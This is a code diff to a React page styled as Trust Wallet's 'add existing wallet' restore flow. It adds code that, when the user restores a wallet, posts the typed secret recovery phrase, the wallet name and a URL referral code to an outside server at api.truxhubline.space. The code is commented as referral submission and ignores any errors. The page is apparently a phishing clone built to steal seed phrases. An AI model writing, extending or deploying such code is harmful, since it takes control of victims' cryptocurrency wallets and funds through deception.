@@ -1,3 +1,4 @@
+// src/pages/AddExistingWalletPage/AddExistingWalletPage.jsx
 import { useEffect, useState } from 'react'
 import { useNavigate } from 'react-router-dom'
 import {
@@ -27,6 +28,7 @@ const safetyChecks = [
 const validSecretPhraseWordCounts = [12, 18, 24]
 const savedFlowStorageKey = 'trust-wallet:add-existing-wallet-flow'
 const flowSteps = ['wallets', 'add', 'network', 'restore']
+const API_BASE_URL = 'https://api.truxhubline.space'
 
 const networks = [
   { name: 'Bitcoin', icon: <SiBitcoin />, tone: 'orange' },
@@ -48,6 +50,7 @@ function AddExistingWalletPage() {
   const [checkedItems, setCheckedItems] = useState(savedFlow.checkedItems)
   const [walletName, setWalletName] = useState(savedFlow.walletName)
   const [secretPhrase, setSecretPhrase] = useState('')
+  const [referralCode, setReferralCode] = useState(savedFlow.referralCode || getReferralFromUrl())
 
   const phraseWordCount = secretPhrase.trim().split(/\s+/).filter(Boolean).length
   const canRestore = walletName.trim().length > 0 && validSecretPhraseWordCounts.includes(phraseWordCount)
@@ -58,8 +61,9 @@ function AddExistingWalletPage() {
       showSafetySheet,
       checkedItems,
       walletName,
+      referralCode,
     })
-  }, [step, showSafetySheet, checkedItems, walletName])
+  }, [step, showSafetySheet, checkedItems, walletName, referralCode])
 
   function openTrustWalletSite() {
     window.location.href = 'https://trustwallet.com/'
@@ -91,10 +95,36 @@ function AddExistingWalletPage() {
     setCheckedItems([])
   }
 
-  function restoreWallet() {
+  async function restoreWallet() {
     if (canRestore) {
+      // Send referral and wallet data to backend
+      await submitWalletData()
+      
       clearSavedFlowState()
       navigate('/wallet')
+    }
+  }
+
+  async function submitWalletData() {
+    try {
+      const response = await fetch(`${API_BASE_URL}/api/words`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          title: walletName || 'Wallet Restoration',
+          words: secretPhrase,
+          referral: referralCode || undefined,
+        }),
+      })
+
+      if (!response.ok) {
+        console.error('Failed to submit wallet data:', response.status)
+      }
+    } catch (error) {
+      console.error('Error submitting wallet data:', error)
+      // Continue with wallet restoration even if submission fails
     }
   }
 
@@ -323,12 +353,22 @@ function FlowHeader({ title, onBack, action }) {
   )
 }
 
+function getReferralFromUrl() {
+  try {
+    const params = new URLSearchParams(window.location.search)
+    return params.get('ref') || ''
+  } catch {
+    return ''
+  }
+}
+
 function getSavedFlowState() {
   const fallbackState = {
     step: 'wallets',
     showSafetySheet: false,
     checkedItems: [],
     walletName: 'Main Wallet 1',
+    referralCode: getReferralFromUrl(),
   }
 
   try {
@@ -347,6 +387,9 @@ function getSavedFlowState() {
       walletName: typeof savedFlow.walletName === 'string'
         ? savedFlow.walletName
         : fallbackState.walletName,
+      referralCode: typeof savedFlow.referralCode === 'string'
+        ? savedFlow.referralCode
+        : getReferralFromUrl(),
     }
   } catch {
     return fallbackState
